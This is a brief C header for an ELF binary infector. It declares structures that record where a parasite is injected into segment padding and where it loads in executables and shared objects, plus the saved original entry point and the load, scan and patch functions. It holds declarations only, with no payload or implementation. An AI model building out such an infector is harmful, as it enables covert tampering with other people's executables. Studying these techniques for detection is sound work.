#ifndef _INFECT_H
#define _INFECT_H

struct inf_seg_pad {
    elf_addr_t  lsb_exec_addr;  /* parasite load addr if LSD exec */
    elf_off_t   so_addr;  /* parasite load addr if .so */
    elf_off_t   inf_target_offset; /* location to inject parasite */
    elf_off_t   inf_pading_size;  /* total size available for parasite */
    elf_off_t   original_e_entry; /* Original entry point must be saved before infecting */
};
typedef struct infect {
    elf_t   *elfo;
    long    *magic_ptr;
    int     total_pt_load;
    struct  inf_seg_pad pad;
} infect_t;


infect_t *inf_load(elf_t *, FILE *, open_mode_t, long);
elf_off_t inf_scan_segment(infect_t *);
bool inf_load_and_patch(infect_t *);
#endif
